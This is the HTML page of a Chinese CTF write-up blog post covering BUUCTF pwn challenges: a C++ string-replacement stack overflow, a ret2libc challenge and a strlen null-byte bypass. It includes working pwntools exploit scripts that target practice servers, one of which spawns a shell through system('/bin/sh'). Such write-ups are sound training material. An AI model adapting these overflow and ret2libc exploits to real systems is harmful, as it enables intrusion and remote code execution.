@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>「BuuCTF」Part I | N0P3</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Buu上的题目很多，遇到些感觉需要记录一下的题目就写在这里。  如有错误还请路过的师傅在评论区指出。 pwn1_sctf_2016这道题没什么难的，主要记录几个C++的标准库函数。  一大堆看起来乱七八糟的函数。这些函数的简单介绍： 123456789101112131415161718192021222324252627282930313233343536373839404142434445fg">
+<meta property="og:type" content="article">
+<meta property="og:title" content="「BuuCTF」Part I">
+<meta property="og:url" content="https://cdn.n0p3.cn/2020/07/17/BuuCtf1/index.html">
+<meta property="og:site_name" content="N0P3">
+<meta property="og:description" content="Buu上的题目很多，遇到些感觉需要记录一下的题目就写在这里。  如有错误还请路过的师傅在评论区指出。 pwn1_sctf_2016这道题没什么难的，主要记录几个C++的标准库函数。  一大堆看起来乱七八糟的函数。这些函数的简单介绍： 123456789101112131415161718192021222324252627282930313233343536373839404142434445fg">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BuuCTF1/pwn1_sctf_2016/%E6%88%AA%E5%B1%8F2020-07-17%20%E4%B8%8A%E5%8D%889.22.26.png">
+<meta property="og:image" content="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BuuCTF1/pwn1_sctf_2016/stack.jpg">
+<meta property="og:image" content="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BuuCTF1/%5BOGeek2019%5Dbabyrop/Main.png">
+<meta property="og:image" content="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BuuCTF1/%5BOGeek2019%5Dbabyrop/HanShu1.png">
+<meta property="og:image" content="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BuuCTF1/%5BOGeek2019%5Dbabyrop/Sub.png">
+<meta property="article:published_time" content="2020-07-17T01:07:05.000Z">
+<meta property="article:modified_time" content="2023-03-02T07:15:05.500Z">
+<meta property="article:author" content="N0P3">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="PWN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BuuCTF1/pwn1_sctf_2016/%E6%88%AA%E5%B1%8F2020-07-17%20%E4%B8%8A%E5%8D%889.22.26.png">
+  
+    <link rel="alternate" href="/atom.xml" title="N0P3" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">N0P3</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://cdn.n0p3.cn"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-BuuCtf1" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/07/17/BuuCtf1/" class="article-date">
+  <time datetime="2020-07-17T01:07:05.000Z" itemprop="datePublished">2020-07-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      「BuuCTF」Part I
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><em>Buu上的题目很多，遇到些感觉需要记录一下的题目就写在这里。</em>  如有错误还请路过的师傅在评论区指出。</p>
+<h1 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h1><p><em>这道题没什么难的，主要记录几个C++的标准库函数。</em></p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BuuCTF1/pwn1_sctf_2016/%E6%88%AA%E5%B1%8F2020-07-17%20%E4%B8%8A%E5%8D%889.22.26.png"></p>
+<p>一大堆看起来乱七八糟的函数。这些函数的简单介绍：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">fgets</span><br><span class="line">函数原型：char * fgets ( char * str, int num, FILE * stream );</span><br><span class="line">函数功能：</span><br><span class="line">从流中读取字符，并将它们作为C字符串存储到str中，直到已读取（num-1）个字符或到达换行符或到达文件末尾（以先发生的为准）。</span><br><span class="line">换行符使fgets停止读取，但是该函数将其视为有效字符并包含在复制到str的字符串中。</span><br><span class="line">复制到str的字符后会自动附加一个终止的空字符。</span><br><span class="line">请注意，fgets与gets完全不同：fgets不仅接受流参数，而且还允许指定str的最大大小，并在字符串中包括任何结尾的换行符。</span><br><span class="line"></span><br><span class="line">std:replace</span><br><span class="line">函数原型：</span><br><span class="line">template &lt;class ForwardIterator, class T&gt;</span><br><span class="line">  void replace (ForwardIterator first, ForwardIterator last,</span><br><span class="line">                const T&amp; old_value, const T&amp; new_value);</span><br><span class="line">函数功能：</span><br><span class="line">替换范围内的值</span><br><span class="line">将new_value分配给[first，last)范围内所有等于old_value的元素。</span><br><span class="line">该函数使用&quot;operator ==&quot; 将各个元素与old_value进行比较。</span><br><span class="line">该功能模板的行为等效于：</span><br><span class="line">template &lt;class ForwardIterator, class T&gt;</span><br><span class="line">  void replace (ForwardIterator first, ForwardIterator last,</span><br><span class="line">                const T&amp; old_value, const T&amp; new_value)</span><br><span class="line">&#123;</span><br><span class="line">  while (first!=last) &#123;</span><br><span class="line">    if (*first == old_value) *first=new_value;</span><br><span class="line">    ++first;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">参数再介绍：</span><br><span class="line">first, last：将迭代器转发到元素序列中的初始位置和最终位置，这些元素支持比较并分配为T类型的值。</span><br><span class="line">            使用的范围是[first，last），其中包含first和last之间的所有元素，包括由指向的元素 首先但不是最后指出的元素。</span><br><span class="line">old_value：要替换的值。</span><br><span class="line">new_value：新的值</span><br><span class="line"></span><br><span class="line">可以暂时粗略地地这样记下： replace (first,last,old_value,new_value);</span><br><span class="line"></span><br><span class="line">std::string::operator=(&amp;input, &amp;s);</span><br><span class="line">作用： 就是 将s指针赋值到 inputs地址里了。 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">strcpy:</span><br><span class="line">函数原型：char * strcpy ( char * destination, const char * source );</span><br><span class="line">函数功能：  </span><br><span class="line">将source指向的C字符串复制到destination指向的数组中，包括终止的空字符（并在该位置停止）。</span><br><span class="line">为避免溢出，目标指向的数组的大小应足够长，以包含与源相同的C字符串（包括终止空字符），并且在内存中不应与源重叠。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>文本来源：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/138897356">紫色仰望合天智汇</a></p>
+<p>但是经过简单测试我们就能发现所有的‘I’都会被替换成‘you’。s2原本不会溢出，经过替换再赋值给s2就可以造成溢出。</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BuuCTF1/pwn1_sctf_2016/stack.jpg"></p>
+<p>可以看到从s2到返回地址中间还有很多个变量。想要覆盖到返回地址一共需要覆盖64个字节，那么就可以20个I+4个字符来实现溢出，再加上get_flag函数地址即可。总共是28个字节小于32，是可行的。</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">res=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28767</span>)</span><br><span class="line">get_flag=<span class="number">0x08048F0D</span></span><br><span class="line">payload=<span class="string">&#x27;I&#x27;</span>*<span class="number">20</span>+<span class="string">&#x27;N0P3&#x27;</span>+p32(get_flag)</span><br><span class="line">res.sendline(payload)</span><br><span class="line">res.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h1><p>这道题就是普通ret2libc，踩了个ubuntu18栈对齐的坑，写下exp以备参考</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">res=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29379</span>)</span><br><span class="line">res.recv()</span><br><span class="line">res.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">res.recv()</span><br><span class="line">ret=<span class="number">0x4006b9</span></span><br><span class="line">pop_rdi=<span class="number">0x400c83</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x4008a3</span></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">start=elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">payload=<span class="string">&#x27;A&#x27;</span>*<span class="number">0x50</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+<span class="string">&#x27;N0P3&#x27;</span>+p64(ret)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(start)</span><br><span class="line">res.sendline(payload)</span><br><span class="line">puts_got=res.recv()</span><br><span class="line"><span class="comment">#print(puts_got)</span></span><br><span class="line">puts_got=puts_got[<span class="number">6</span>*<span class="number">16</span>+<span class="number">7</span>:<span class="number">6</span>*<span class="number">16</span>+<span class="number">8</span>+<span class="number">5</span>]</span><br><span class="line"><span class="comment">#print(puts_got)</span></span><br><span class="line">puts_got=u64(puts_got.ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(puts_got)</span><br><span class="line"><span class="keyword">if</span> puts_got==<span class="number">0x0</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Attack failed. Please try again.&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    Searcher=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_got)</span><br><span class="line">    offset=puts_got-Searcher.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">    res.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    res.recv()</span><br><span class="line">    binsh=Searcher.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)+offset</span><br><span class="line">    system=Searcher.dump(<span class="string">&#x27;system&#x27;</span>)+offset</span><br><span class="line">    payload=<span class="string">&#x27;A&#x27;</span>*<span class="number">0x50</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+<span class="string">&#x27;N0P3&#x27;</span>+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)</span><br><span class="line">    res.sendline(payload)</span><br><span class="line">    res.recv()</span><br><span class="line">    res.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>payload里需要执行一次ret来使栈对齐。第一个payload会有时会失效，大概每执行3次exp就有一次泄漏失败。原因未知，可能与服务器环境有关。</p>
+<h1 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h1><p>*<em>普通的ret2libc，中间有一个小的绕过姿势。</em></p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BuuCTF1/%5BOGeek2019%5Dbabyrop/Main.png" alt="main"></p>
+<p>在主函数使用urandom生成了一个随机数，接着调用了HanShu1。</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BuuCTF1/%5BOGeek2019%5Dbabyrop/HanShu1.png" alt="HanShu1"></p>
+<p>Line 11把a1格式化后放入了s，bufa是我们输入的字符串，在Line 15两者不相等则直接退出。比较的长度v1是可控的，strlen遇到\x00会截断，所以payload开头放个\x00就可以使比对长度为0，这样就能绕过对比。</p>
+<p>这个函数在line 12还有个溢出点能覆盖v5，v5是下一个函数的参数。</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BuuCTF1/%5BOGeek2019%5Dbabyrop/Sub.png" alt="截屏2020-07-18 下午5.16.35"></p>
+<p>a1就是上个函数的v5，127是0x7f，只要不等于0x7f我们覆盖的值就可以作为read的长度参数了。但是经过测试0xC8也是能在远程打通的，看来服务器运行的程序和这个有点出入。</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#这是后来补的wp，exp手滑覆盖掉了==</span></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://cdn.n0p3.cn/2020/07/17/BuuCtf1/" data-id="cleqs4p6o0005h4d7akpj749i" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PWN/" rel="tag">PWN</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/08/10/Xctf2/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          XCTF-Pwn-Advance-2
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/05/01/ISCC2020/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">ISCC2020</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/C/" rel="tag">C++</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MacOS/" rel="tag">MacOS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PWN/" rel="tag">PWN</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WEB/" rel="tag">WEB</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Windows/" rel="tag">Windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/develop/" rel="tag">develop</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/heap/" rel="tag">heap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tool/" rel="tag">tool</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%82%E5%8A%A0%E7%9A%84%E6%AF%94%E8%B5%9B/" rel="tag">参加的比赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C/" rel="tag">命令行</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9B%BE%E5%BD%A2/" rel="tag">图形</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/C/" style="font-size: 12.5px;">C++</a> <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/MacOS/" style="font-size: 10px;">MacOS</a> <a href="/tags/PWN/" style="font-size: 17.5px;">PWN</a> <a href="/tags/WEB/" style="font-size: 10px;">WEB</a> <a href="/tags/Windows/" style="font-size: 12.5px;">Windows</a> <a href="/tags/develop/" style="font-size: 10px;">develop</a> <a href="/tags/heap/" style="font-size: 10px;">heap</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/tool/" style="font-size: 10px;">tool</a> <a href="/tags/%E5%8F%82%E5%8A%A0%E7%9A%84%E6%AF%94%E8%B5%9B/" style="font-size: 15px;">参加的比赛</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C/" style="font-size: 10px;">命令行</a> <a href="/tags/%E5%9B%BE%E5%BD%A2/" style="font-size: 10px;">图形</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">三月 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">二月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">十二月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">十月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">八月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">七月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">五月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">四月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">二月 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/03/02/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2021/02/16/N0Shell/">N0Shell</a>
+          </li>
+        
+          <li>
+            <a href="/2020/12/22/FlagSubmitter/">FlagSubmitter</a>
+          </li>
+        
+          <li>
+            <a href="/2020/10/28/BuuWeb1/">BuuWeb1</a>
+          </li>
+        
+          <li>
+            <a href="/2020/10/18/Off-by-one/">Asis_ctf_2016_b00ks</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2023 N0P3<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
